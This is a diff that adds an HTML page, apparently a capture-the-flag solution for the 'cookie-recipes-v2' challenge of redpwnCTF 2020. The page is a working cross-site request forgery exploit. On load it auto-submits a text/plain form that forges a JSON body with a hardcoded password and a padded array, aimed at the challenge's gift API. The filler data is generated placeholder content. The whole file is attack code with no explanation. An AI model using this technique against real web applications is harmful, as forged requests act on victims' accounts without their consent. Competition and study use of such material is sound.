@@ -1,0 +1,79 @@
+<html>
+    <head>
+        <script>
+            document.addEventListener('DOMContentLoaded', () => {
+                const form = document.getElementById('gift');
+                const urlParams = new URLSearchParams(window.location.search);
+                const userId = urlParams.get('userId');
+                const local = urlParams.get('local');
+                let url;
+                if (local === 'null') {
+                    url = "https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=" + userId;
+                } else {
+                    url = "http://localhost:3000/api/gift?id=" + userId;
+                }
+                const input = document.getElementById('json');
+                const trash = document.getElementById('trash');
+
+                let value='", "test": [ARRAY]}';
+                input.setAttribute("value", value.replace('ARRAY', trash.innerText));
+                form.setAttribute('action',url);
+                form.submit();
+            });
+        </script>
+    </head>
+    <body>
+        <form id="gift" method="POST" enctype="text/plain">
+            <input name='{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn", "equals":"' value='"}' id="json">
+        </form>
+        <div id="trash">
+            [
+            {
+              "_id": "5ef3038107661a804efac455",
+              "index": 0,
+              "guid": "b95aaa4a-cbf6-49eb-aebb-f9302e994a10",
+              "isActive": false,
+              "balance": "$1,217.41",
+              "picture": "http://placehold.it/32x32",
+              "age": 20,
+              "eyeColor": "brown",
+              "name": "Marcella Rasmussen",
+              "gender": "female",
+              "company": "ACRODANCE",
+              "email": "marcellarasmussen@acrodance.com",
+              "phone": "+1 (973) 417-3777",
+              "address": "282 Church Avenue, Columbus, Ohio, 1378",
+              "about": "Sit ea reprehenderit exercitation elit ad consequat sint ullamco. Proident nostrud aliqua ut aliquip dolor eiusmod laboris non laboris officia. Ea incididunt ipsum ipsum eiusmod reprehenderit amet quis id. Do in cupidatat officia do reprehenderit magna id consectetur cillum non minim veniam tempor. Nisi est incididunt cupidatat id culpa dolor laborum cillum non nostrud consequat dolor magna mollit. Aliqua aute sint fugiat reprehenderit reprehenderit commodo.\r\n",
+              "registered": "2017-03-20T05:54:43 +07:00",
+              "latitude": -5.78462,
+              "longitude": 28.716314,
+              "tags": [
+                "tempor",
+                "mollit",
+                "quis",
+                "pariatur",
+                "eiusmod",
+                "deserunt",
+                "voluptate"
+              ],
+              "friends": [
+                {
+                  "id": 0,
+                  "name": "Santos Owen"
+                },
+                {
+                  "id": 1,
+                  "name": "Keri Guerrero"
+                },
+                {
+                  "id": 2,
+                  "name": "Clements Nelson"
+                }
+              ],
+              "greeting": "Hello, Marcella Rasmussen! You have 6 unread messages.",
+              "favoriteFruit": "banana"
+            }
+          ]
+        </div>
+    </body>
+</html>
